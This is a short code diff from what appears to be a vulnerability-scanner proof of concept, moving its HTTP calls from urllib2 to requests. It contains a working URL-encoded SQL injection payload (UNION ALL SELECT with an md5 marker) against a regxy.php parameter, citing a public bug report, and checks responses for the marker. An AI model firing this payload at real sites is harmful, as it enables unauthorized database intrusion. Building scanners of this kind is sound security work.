@@ -35,10 +35,9 @@ class Poc(ABPoc):
             # http://www.wooyun.org/bugs/wooyun-2010-046528
             payload = '/regxy.php?membertypeid=-9914%27%20UNION%20ALL%20SELECT%2018%2C18%2C18%2C18%2C18%2CCONCAT%280x716b786271%2CIFNULL%28CAST%28md5%283.1415%29%20AS%20CHAR%29%2C0x20%29%2C0x717a626a71%29%2C18%2C18%2C18%2C18%23'
             verify_url = self.target + payload
-            req = urllib2.Request(verify_url)
-            content = urllib2.urlopen(req).read()
+            req = requests.get(verify_url)
 
-            if req.getcode() == 200 and '4e5172484a7361735357' in content:
+            if req.status_code == 200 and '4e5172484a7361735357' in req.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
